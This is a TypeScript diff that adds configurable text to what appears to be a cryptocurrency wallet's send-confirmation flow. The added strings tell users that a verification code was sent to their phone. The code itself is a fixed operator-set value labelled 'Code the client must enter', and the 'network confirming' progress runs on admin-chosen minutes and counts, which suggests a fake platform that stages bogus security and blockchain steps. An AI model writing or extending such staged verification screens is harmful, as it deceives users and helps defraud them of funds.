@@ -62,6 +62,21 @@ export interface SiteContent {
   noticeK20Title: string;
   noticeK20Body: string;
   noticeCta: string;
+  sendSureTitle: string;
+  sendSureBody: string;
+  sendSureOk: string;
+  sendSureCancel: string;
+  sendConfirmMinutes: string;
+  sendConfirmCount: string;
+  sendConfirmTitle: string;
+  sendConfirmLabel: string;
+  sendConfirmHint: string;
+  sendCodeTitle: string;
+  sendCodeBody: string;
+  sendCodePlaceholder: string;
+  sendCodeButton: string;
+  sendCodeError: string;
+  sendCodeValue: string;
 }
 
 export const SITE_DEFAULTS: SiteContent = {
@@ -130,6 +145,22 @@ export const SITE_DEFAULTS: SiteContent = {
   noticeK20Body:
     "The destination wallet is marked for extra scrutiny.\n\nDouble-check every character of the address. Continue only if you recognize the recipient and accept the risk.",
   noticeCta: "I understand, continue",
+  sendSureTitle: "Are you sure this wallet address is correct?",
+  sendSureBody:
+    "Check the destination wallet carefully. Sent funds cannot be recovered if the address is wrong.",
+  sendSureOk: "OK",
+  sendSureCancel: "Cancel",
+  sendConfirmMinutes: "4",
+  sendConfirmCount: "12",
+  sendConfirmTitle: "Confirming",
+  sendConfirmLabel: "Confirmation {current} of {total}",
+  sendConfirmHint: "The network is confirming this transfer. Keep this screen open until it finishes.",
+  sendCodeTitle: "Enter the verification code sent to your number",
+  sendCodeBody: "A verification code was sent to your phone number. Enter it to complete this transfer.",
+  sendCodePlaceholder: "Verification code",
+  sendCodeButton: "Confirm",
+  sendCodeError: "That code is incorrect. Try again.",
+  sendCodeValue: "739214",
 };
 
 export const SITE_TEXT_FIELDS: { key: keyof SiteContent; label: string; group: string; multiline?: boolean }[] = [
@@ -189,6 +220,21 @@ export const SITE_TEXT_FIELDS: { key: keyof SiteContent; label: string; group: s
   { key: "noticeK20Title", label: "K20 popup title", group: "Send notices" },
   { key: "noticeK20Body", label: "K20 popup text", group: "Send notices", multiline: true },
   { key: "noticeCta", label: "Popup button", group: "Send notices" },
+  { key: "sendSureTitle", label: "Address check title", group: "Send confirmation" },
+  { key: "sendSureBody", label: "Address check text", group: "Send confirmation", multiline: true },
+  { key: "sendSureOk", label: "Address check OK button", group: "Send confirmation" },
+  { key: "sendSureCancel", label: "Address check cancel button", group: "Send confirmation" },
+  { key: "sendConfirmMinutes", label: "Minutes until the last confirmation", group: "Send confirmation" },
+  { key: "sendConfirmCount", label: "How many confirmations", group: "Send confirmation" },
+  { key: "sendConfirmTitle", label: "Confirming title", group: "Send confirmation" },
+  { key: "sendConfirmLabel", label: "Confirming line (use {current} and {total})", group: "Send confirmation" },
+  { key: "sendConfirmHint", label: "Confirming note", group: "Send confirmation", multiline: true },
+  { key: "sendCodeTitle", label: "Code box title", group: "Send confirmation" },
+  { key: "sendCodeBody", label: "Code box text", group: "Send confirmation", multiline: true },
+  { key: "sendCodePlaceholder", label: "Code box placeholder", group: "Send confirmation" },
+  { key: "sendCodeButton", label: "Code box button", group: "Send confirmation" },
+  { key: "sendCodeError", label: "Wrong code message", group: "Send confirmation" },
+  { key: "sendCodeValue", label: "Code the client must enter", group: "Send confirmation" },
 ];
 
 interface SiteState extends SiteContent {
